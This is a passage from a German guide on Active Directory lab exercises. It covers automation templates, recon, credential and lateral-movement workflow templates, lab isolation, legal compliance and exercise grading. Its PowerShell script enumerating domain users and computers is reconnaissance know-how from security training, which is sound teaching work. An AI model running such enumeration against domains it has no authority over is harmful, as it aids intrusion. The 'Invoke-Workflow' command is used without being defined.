| Python (ldap3, pandas) | CLI/Script | plattformübergreifende Abfragen, Datenverarbeitung | Portabilität, starke Bibliotheken        | Abhängigkeiten, Lernkurve            |
```

Wichtige Prinzipien für ein robustes Tool-Set:
- Modularität: Jedes Werkzeug oder Skript hat eine klare Funktion.
- Wiederverwendbarkeit: Gemeinsame Funktionen in Bibliotheken auslagern.
- Sicherheit: Nur in isolierten Labs arbeiten, sensiblere Daten schützen, Least-Privilege-Prinzip beachten.
- Dokumentation: KlareREADME-Dateien, Parameterbeschreibungen, Beispielaufrufe.
- Reproduzierbarkeit: Versionierung von Skripten, Umgebungsdefinitionen (z. B. Virtualisierung/Container).

Zusammenfassung: Eine hybride Struktur, die CLI-Skripte für Automatisierung mit GUI-Visualisierungen für Analyse ergänzt, bietet die beste Balance zwischen Effizienz und Transparenz im GoAD-Lab. Die konkrete Tool-Auswahl sollte sich nach der Zielsetzung, Team-Kompetenzen und der vorhandenen Infrastruktur richten. Ein klar definierter Arbeitsablauf, Versionierung und Sicherheitsrichtlinien sichern langfristige Wartbarkeit und Lernfortschritt.

### 6.2 Automatisierung mit PowerShell und Python-Skripten

Automatisierung ist der Schlüssel zu konsistenten Abläufen im GoAD-Lab. PowerShell ist das primäre Werkzeug für Windows-basierte Domänenaufgaben, während Python plattformübergreifend für Datenverarbeitung, Berichte und Orchestrierung eingesetzt wird. Durch die Kombination beider Sprachen entstehen robuste Pipelines, die sich in Pläne, Tests und Berichte verwandeln lassen.

Grundprinzipien:
- Trennung von Aufgaben: Erzeuge kleine, wiederverwendbare Module statt großer Monolithen.
- Fehlerbehandlung: Umfassendes Logging, klare Fehlerausgaben, Exit-Codes für CI/CD-Integrationen.
- Konfiguration: Verwende konfigurierbare Parameterquellen (JSON, YAML, Umgebungsvariablen).
- Interoperabilität: JSON als gemeinsamer Datenträger zwischen PowerShell und Python.

Beispiel-Template 1: PowerShell-Recon-Skript (Skelett)
```
param(
  [string]$Domain = "",
  [string]$Output = "recon.json"
)

try {
  Import-Module ActiveDirectory -ErrorAction Stop

  $DomainInfo = Get-ADDomain
  $Users = Get-ADUser -Filter * -Properties SamAccountName,Enabled,LastLogonDate
  $Computers = Get-ADComputer -Filter * -Properties DNSHostname,OperatingSystem

  $Report = @{
    Domain = $DomainInfo.Name
    Timestamp = (Get-Date).ToString("o")
    Users = $Users | Select-Object SamAccountName, Enabled, LastLogonDate
    Computers = $Computers | Select-Object DNSHostname, OperatingSystem
  }

  $Report | ConvertTo-Json -Depth 2 | Out-File -Encoding UTF8 $Output
} catch {
  Write-Error "Recon-Skript fehlgeschlagen: $_"
  exit 1
}
```

Beispiel-Template 2: Python-Skript für Import und Weiterverarbeitung
```
import json
import sys

def load_json(path):
  with open(path, 'r', encoding='utf-8') as f:
    return json.load(f)

def summarize(data):
  users = len(data.get("Users", []))
  computers = len(data.get("Computers", []))
  return {"user_count": users, "computer_count": computers}

if __name__ == "__main__":
  in_path = sys.argv[1] if len(sys.argv) > 1 else "recon.json"
  data = load_json(in_path)
  summary = summarize(data)
  print(json.dumps(summary, indent=2))
```

Beispiel-Template 3: Orchestrierung über JSON-konfiguriertes Pipeline-Definition
```
{
  "pipeline": {
    "name": "Recon_Pipeline",
    "steps": [
      {"id": "step1", "tool": "PowerShell", "script": "recon.ps1", "output": "recon.json"},
      {"id": "step2", "tool": "Python", "script": "analyze.py", "input": "recon.json", "output": "summary.json"}
    ],
    "on_error": "abort",
    "log_level": "INFO"
  }
}
```

Ausführungsideen:
```
PowerShell-Ausführung im Testmodus
```
```
python analyze.py recon.json
```

Hinweise:
- Verwende stets Testumgebungen oder isolierte Lab-Instanzen.
- Nutze Logging, damit Audits und Nachverfolgbarkeit gewährleistet sind.
- Strukturierte Ausgaben (JSON/CSV) erleichtern Weiterverarbeitung und Berichte.

Dieses Kapitel zeigt, wie PowerShell als zentrale Automatisierungs-Schicht genutzt wird, während Python für Datenaufbereitung, Visualisierung und plattformübergreifende Aufgaben herangezogen wird. Durch klare Module, Mechanismen zur Fehlerbehandlung und standardisierte Eingabe-/Ausgabeformate entstehen stabile Pipelines, die im GoAD-Lab sowohl für Recon als auch für Dormant- oder Auswertungsaufgaben zuverlässig funktionieren.

### 6.3 Workflow-Templates: Recon, Credential, Lateral Movement

Workflows definieren, wie Aufgaben in einem GoAD-Lab schrittweise ausgeführt, protokolliert und auditiert werden. Die vorliegenden Templates dienen als Baukasten, die sich an konkrete Laborsituationen anpassen lassen. Jedes Template umfasst Zielsetzung, Eingaben/Ausgaben, konkrete Schritte, empfohlene Werkzeuge, Sicherheits- und Abbruchkriterien sowie ein Beispiel der Artefakte.

Recon-Template (Ermittlung von Assets und Beziehungen)
- Ziel: Aufbau eines konsistenten Überblicks über Domain-Objekte (Benutzer, Computer, Gruppen) und deren Beziehungen.
- Eingaben: Domain-Name, Pfadsicht, zeitliche Fenster
- Ausgabe: recon.json, assets.csv, graph.dot (Beziehungsgraph)
- Schritte:
  1) Domäneninformationen abrufen
  2) Benutzer- und Computerkonten enumerieren
  3) Beziehungen (Gruppenmitgliedschaften, Abhängigkeiten) extrahieren
  4) Ergebnisse in JSON/CSV speichern; Graph generieren
- Empfohlene Werkzeuge: PowerShell (Get-ADDomain, Get-ADUser, Get-ADGroupMember), Python (pandas, graphviz)
- Sicherheit: Kein Zugriff auf produktive Systeme außerhalb des Labors; Minimale Privilegien verwenden
- Artefakte-Beispiele:
```
{
  "workflow": "Recon",
  "domain": "lab.local",
  "timestamp": "2025-08-24T12:00:00Z",
  "users": [...],
  "computers": [...],
  "relationships": [...]
}
```

Credential-Template (Beobachtung sicherer Credential-Muster)
- Ziel: Identifikation potenziell riskanter Credential-Pfaden und -Nutzungsmuster ohne Dumping sensibler Inhalte.
- Eingaben: Zugriffskontext, Audit-Policy
- Ausgabe: credential_risks.json, report.html
- Schritte:
  1) Ermittlung von privilegierten Konten, Passwort-Änderungsdauern, ungefilterten Zugriffen
  2) Prüfung von Privilege-Assignments (z. B. unbeabsichtigte Gruppen)
  3) Generierung eines Berichts mit Empfehlungen (Passwort-Policy, MFA-Optionen)
- Empfohlene Werkzeuge: PowerShell (Get-ADUser mit erweiterten Eigenschaften), Python (Berichte, KPI-Dashboards)
- Artefakte-Beispiele:
```
{
  "workflow": "Credential",
  "risks": [
     {"user": "svc_account", "risk": "password_age_exceeded", "value": 120}
  ],
  "policyRecommendations": ["MFA erzwingen", "Passwortrotation planen"]
}
```

Lateral Movement-Template (sichere Simulation von Bewegungen im Lab)
- Ziel: Nachweisbare Tests der Erkennung von Bewegungswegen, ohne schädliche Aktionen außerhalb des Labs.
- Eingaben: Netzsegmentierung, erlaubte Probes, Zeitfenster
- Ausgabe: movement_simulation.json, detections.csv
- Schritte:
  1) Definition eines sicheren Pfades für die Simulation (z. B. gefälschte Accounts)
  2) Simulation von Berechtigungsprüfungen, Pfadwechseln innerhalb genehmigter Simulationsgrenzen
  3) Erfassung von Detektionen und Metriken
- Empfohlene Werkzeuge: GUI-Tools für Graph-Visualisierung, PowerShell-Trigger-Skripte, Python-Analysetools
- Artfakte-Beispiele:
```
{
  "workflow": "LateralMovement",
  "simulations": [
     {"from": "userA", "to": "host1", "action": "simulate_pivot"}
  ],
  "detections": [{"rule": "SilentAudit", "count": 3}]
}
```

Beispiele zur Ausführung:
```
# Recon-Template ausführen
Invoke-Workflow -Definition recon_template.json

# Credential-Template ausführen
Invoke-Workflow -Definition credential_template.json

# Lateral Movement-Template ausführen (Sicherheitsmodus)
Invoke-Workflow -Definition lateral_template.json -SafeMode
```

Sicherheit und Ethik:
- Alle Templates sind für kontrollierte Laborsituationen gedacht. Der Einsatz in produktiven Umgebungen erfordert klare Genehmigungen, Zustimmung der Verantwortlichen und strikte Beachtung von Compliance-Richtlinien.
- Dokumentation, Revisionsspuren und Rollback-Mechanismen sind integraler Bestandteil jedes Workflows.
- Die Templates legen Wert auf Transparenz, Nachvollziehbarkeit und Minimierung potenzieller Auswirkungen.

Zusammenfassend bieten diese Kapitelabschnitte eine strukturierte Grundlage, um Tools sinnvoll zu kombinieren, Automatisierungserfolge zu berichten und sichere, wiederholbare Workflows in einem GoAD-Lab zu etablieren. Durch die klare Trennung von Recon, Credential-Assessment und sicheren Lateral-Movement-Simulationen lässt sich die Lern- und Testkultur stärken, ohne Risiko von unbeabsichtigten Störungen oder Missbrauch.
## Kapitel: Ethik, Sicherheit und Best Practices für GoAD-Lab-Übungen

### 7.1 Sichere Lab-Administration, Netzsegmentierung und Isolation

In GoAD-Lab-Übungen ist die sichere Verwaltung der Infrastruktur der Grundstein für zuverlässige, reproduzierbare und ethisch unbedenkliche Lernprozesse. Die sichere Lab-Administration umfasst Zugriffssteuerung, Auditierung, Automatisierung und klare Verantwortlichkeiten. Netzsegmentierung und Isolation verhindern unbeabsichtigte Auswirkungen auf andere Systeme, minimieren das Risiko externer Exposition und schaffen kontrollierte Lernumgebungen, in denen Experimente isoliert durchgeführt werden können.

Wichtige Prinzipien
- Least Privilege und Separation of Duties: Jede Rolle erhält nur die minimal notwendigen Rechte. Admin- und Benutzerkonten werden strikt voneinander getrennt.
- Immutable Infrastruktur und Automatisierung: Infrastrukturkonfigurationen werden versioniert, automatisiert aufgebaut und nach Bedarf wiederhergestellt.
- Auditierung und Nachverfolgbarkeit: Alle relevanten Aktionen werden protokolliert, Changes werden nachvollziehbar dokumentiert.
- Backup, Snapshots und Wiederherstellung: Regelmäßige Backups und die Fähigkeit zu schnellen Wiederherstellungen sind standardisiert.

Netzsegmentierung und Isolation
- Netzsegmente definieren: Management-, Übungs- und Monitoring-Segmente trennen sensible Administration von Übungsdaten.
- Virtuelle Netze und VLANs: Verwenden Sie VLAN-basiertes oder isoliertes Overlay-Netzwerkdesign, um Verkehr zwischen Segmenten zu kontrollieren.
- Firewall- und Zugriffskontrollen: Firewallregeln, NAT-Strategien und Access-Control-Listen spezifizieren, welcher Verkehr erlaubt ist.
- Ephemere Umgebungen: Übungsinstanzen sollten nach Abschluss automatisch gelöscht oder in einen sicheren Zustand zurückversetzt werden.
- Monitoring ohne Leckagen: Monitoring- und Logging-Komponenten sind separat, sodass sensible Verwaltungsdaten nicht versehentlich exponiert werden.

Implementierungsbeispiele (Auszug)
- VLAN- oder Bridge-basierte Segmentierung:
```
ip link add link eth0 name eth0.100 type vlan id 100
ip addr add 192.168.100.1/24 dev eth0.100
ip link set eth0.100 up
```
- Docker-Netzwerk isoliert konfigurieren:
```
docker network create --driver bridge goad_lab_lab
```
- Zugriffsbeschränkungen am Host (Beispiel ufw):
```
ufw default deny incoming
ufw default allow outgoing
ufw allow from 192.168.100.0/24 to any port 22
ufw enable
```
- Absicherung von GoAD-Lab-Containern durch Ressourcenkontrollen:
```
docker run --memory="512m" --cpus="0.5" --network goad_lab_lab goad/target:latest
```

Praktische Checkliste
- Klar definierte Rollen und Zugriffsmodelle existieren.
- Es gibt eine dokumentierte Netzwerkarchitektur mit Segmenten, Zonen und Regeln.
- Alle Änderungen werden versioniert und nachvollziehbar protokolliert.
- Ephemere Umgebungen nutzen automatisierte Provisionierung und saubere Säuberung nach der Übung.
- Es gibt einen Notfall- und Wiederherstellungsplan (Backup, Snapshot, Rollback).

Beispielhafte Dokumentation (Auszug)
- Infrastruktur-Diagramm (Vereinfachung):
```
[Management-Netz] ---- [Lab-Netz] ---- [Target-System]
                        |                 |
                   Logging/Monitoring  Backups
```
- Richtlinien-Schnellcheckliste:
```
- Zugriffskontrollen implementiert
- Segmentierung dokumentiert
- Backups vorhanden und testbar
- Ephemeral-Umgebungen wiederherstellbar
- Audit-Logs gesammelt und geschützt
```

### 7.2 Rechtliche Rahmenbedingungen, Ethik und Compliance

GoAD-Lab-Übungen operieren an der Schnittstelle zwischen Lernen, Sicherheit und Recht. Die Einhaltung rechtlicher Vorgaben und ethischer Grundsätze ist unverzichtbar, um Lernprozesse verantwortungsvoll zu gestalten und Haftungsrisiken zu minimieren. Der Kern besteht darin, klare Grenzen, Verantwortlichkeiten und Dokumentation zu haben, sodass alle Beteiligten wissen, was erlaubt ist, wie Daten geschützt werden und wie Verstöße gemeldet werden.

Zentrale rechtliche und ethische Aspekte
- Rechtsrahmen und Compliance: Datenschutzgesetze (z. B. DSGVO/ GDPR), Urheberrecht, IT-Sicherheitsgesetze und branchenspezifische Vorgaben gelten auch in Lernumgebungen.
- Einwilligung und Umfang: Vor Beginn einer Übung muss der Scope explizit definiert, genehmigt und dokumentiert werden. Änderungen sind erneut freizugeben.
- Zweckbindung und Datenminimierung: Nur notwendige Daten werden erhoben oder verwendet; personenbezogene Daten sollten entweder anonymisiert oder synthetisch sein.
- Schutz von Dritten: Aktivitäten dürfen keine Systeme Dritter beeinträchtigen oder negative Auswirkungen auf deren Infrastruktur haben.
- Ethik des Umgangs mit Schwachstellen: Entdeckte Schwachstellen sind verantwortungsvoll zu melden (Responsible Disclosure), keine unautorisierten Exploits außerhalb des vereinbarten Scopes durchzuführen.
- Transparenz und Rechenschaft: Alle Aktivitäten sollen nachvollziehbar protokolliert und bei Bedarf gegenüber Betreuenden und Prüfern dokumentiert werden.

Konkrete Empfehlungen
- Nutzen Sie synthetische oder anonymisierte Datensätze statt realer persönlicher Daten.
- Definieren Sie klare Nutzungsbedingungen, Sicherheits- und Verhaltenskodizes (Code of Conduct) für Teilnehmende.
- Dokumentieren Sie Einwilligungen, Genehmigungen und Scope-Begrenzungen in einem Lab Use Agreement.
- Verwalten Sie Zertifikate, Schlüssel und Zugangsdaten sicher; verwenden Sie zeitlich begrenzte Tokens mit automatischer Ablauflogik.
- Führen Sie eine Risikobewertung für jede Übung durch (Was könnte schiefgehen? Welche Auswirkungen hätte ein Fehler?).
- Richten Sie einen formalen Melde- und Eskalationsprozess ein, falls Vorfälle auftreten.

Beispielhafte Compliance-Checkliste
- Ist der Übungsumfang schriftlich genehmigt?
- Werden personenbezogene Daten vermieden oder anonymisiert?
- Sind Audit-Logs aktiviert und gegen Manipulation geschützt?
- Gibt es klare Regeln zum Zugriff, zur Datenspeicherung und zur Datenlöschung?
- Wurde ein Responsible-Disclosure-Mechanismus kommuniziert?

Beispieltext eines Lab Use Agreement (Auszug)
- Zweck der Übung, Umfang, Verantwortlichkeiten der Teilnehmenden.
- Verbotene Handlungen außerhalb des genehmigten Scopes.
- Geheimhaltungspflichten und Datenschutz.
- Verfahren bei Sicherheitsvorfällen und Meldemethoden.
- Rechtsfolgen bei Verstößen und Prüfungsmodalitäten.

Tabellarische Gegenüberstellung von Frameworks (Auszug)
```
| Framework        | Fokus                           | Anwendung im Lab                        |
|------------------|---------------------------------|-----------------------------------------|
| ISO 27001        | Informationssicherheitsmanagement | Sicherheitsleitfaden, Auditierung         |
| NIST SP 800-53   | Sicherheitskontrollen              | Auswahl und Implementierung von Kontrollen |
| GDPR / DSGVO     | Datenschutz und Privatsphäre       | Datenminimierung, Anonymisierung, Transparenz |
| SOC 2 / CSA STAR | Kontrollen zur Vertrauenswürdigkeit | Dokumentation, Monitoring, Reporting        |
```

Praktische Hinweise
- Arbeiten Sie vorrangig in isolierten, genehmigten Lernumgebungen statt in Produktionsnetzen.
- Dokumentieren Sie alle Genehmigungen, Scope-Definitionen und Änderungen an der Übung.
- Schulen Sie Teilnehmende in ethischer Haltung, verantwortungsvollem Handeln und Meldewegen.

### 7.3 Best Practices, Übungsdesign und Bewertung

Gute Übungsgestaltung in GoAD-Lab-Umgebungen verbindet Lernziele, Sicherheit, Reproduzierbarkeit und faire Bewertung. Der Fokus liegt darauf, Lernenden schrittweise konkrete Fähigkeiten zu vermitteln, während gleichzeitig sichergestellt wird, dass Risiken kontrolliert bleiben und ethische Standards eingehalten werden.

Grundprinzipien des Übungsdesigns
- Lernziele klar definieren: Was sollen Teilnehmende am Ende der Übung wissen und können? Ziele sollten messbar, erreichbar und relevant sein.
- Progression und Scaffolding: Übungsaufgaben steigen in Komplexität, von einfachen Konzepten zu integrierten Aufgaben.
- Realistische, aber sichere Szenarien: Szenarien spiegeln reale Herausforderungen wider, bleiben aber innerhalb des genehmigten Scope.
- Sicherheits– und Ethikmaßnahmen integrieren: Vorab-Checklisten, Notfallpläne, klare Regeln zum Umgang mit Schwachstellen.
- Reproduzierbarkeit sicherstellen: Infrastruktur als Code, versionierte Vorlagen und dokumentierte Abläufe.

Übungsdesign und Umsetzung
- Infrastruktur als Code: Verwenden Sie IaC-Tools (z. B. Terraform, Ansible) oder containerbasierte Umgebungen, damit Vorkehrungen reproduzierbar sind.
- Mehrschichtige Übungsumgebungen: Management-Schicht, Übungs-Umgebung, Zielsystem, Überwachung. Jede Schicht hat klare Verantwortlichkeiten.
- Interaktive Aufgaben mit Feedback-Schleifen: Automatisierte Tests, Kennzahlen und zeitgesteuerte Rückmeldungen unterstützen den Lernprozess.
- Sicherheit als Lernziel: Lehren Sie, wie man sicher übt, ohne Schaden zu verursachen. Zum Beispiel, wie man verantwortungsvoll mit Schwachstellen umgeht.
- Barrierefreiheit und Vielfalt: Übungen sollten inklusiv gestaltet sein, damit unterschiedliche Lernvoraussetzungen berücksichtigt werden.

Bewertung und Rubriken
- Formative Bewertung: Laufendes Feedback während der Übung, häufige Checkpoints.
- Summative Bewertung: Abschlussbewertung mit klarer Rubrik, die Kompetenzen in technischen, analytischen und sicherheitsrelevanten Bereichen misst.
- Peer-Review-Option: Teilnehmende bewerten sich gegenseitig anhand strukturierter Kriterien, um Reflexion zu fördern.

Beispielrubrik (Beurteilungsmaßstab)
```
| Kriterium                | Erwartungsniveau | Punktebereich | Beschreibung                                               |
|--------------------------|-------------------|---------------|-----------------------------------------------------------|
| Konzeption der Übung    | Sehr gut          | 0-10          | Zielklarheit, passende Schwierigkeitsstufe, Scope-Abgleich   |
| Umsetzung der Infrastruktur | Sehr gut        | 0-15          | Wiederholbarkeit, IaC/Containerisierung, Dokumentation       |
| Sicherheitsmaßnahmen    | Gut bis sehr gut  | 0-15          | Zugangskontrollen, Isolation, Logging, Notfallpläne           |
| Problemlösungskompetenz | Sehr gut         | 0-20          | Analyse, Fehlersuche, Anpassungsfähigkeit                   |
| Ethik und Compliance     | Sehr gut          | 0-10          | Einhaltung von Richtlinien, Datenschutz, Responsible Disclosure |
| Dokumentation und Reporting | Sehr gut       | 0-10          | Klarheit, Nachvollziehbarkeit, Reproduzierbarkeit            |
```

Beispielaufgabe mit Bewertungsfokus
- Aufgabe: In einer isolierten Lab-Umgebung soll eine Jeweilige Anwendung sicher installiert, konfiguriert und innerhalb definierter Segmente betrieben werden. Teilnehmende sollen eine Risikoanalyse erstellen, eine Absicherung implementieren und einen kurzen Bericht über Sicherheitsmaßnahmen, Compliance-Aspekte und Lernerfahrungen verfassen.
- Beurteilung: Die Lösung wird anhand der Rubrik bewertet, einschließlich der Qualität der Risikoanalyse, der Implementierung von Sicherheitsmaßnahmen, der Reproduzierbarkeit der Umgebung und der Qualität der Dokumentation.

Schlussbemerkung
- Gute Übungsdesigns kombinieren technische Kompetenz mit ethischer Reflexion, fortlaufendem Feedback und klarer Dokumentation. Die Evaluierung sollte fair, transparent und nachvollziehbar sein, damit Lernziele zuverlässig erreicht werden und Teilnehmende sicher und verantwortungsvoll mit GoAD-Lab-Umgebungen arbeiten.
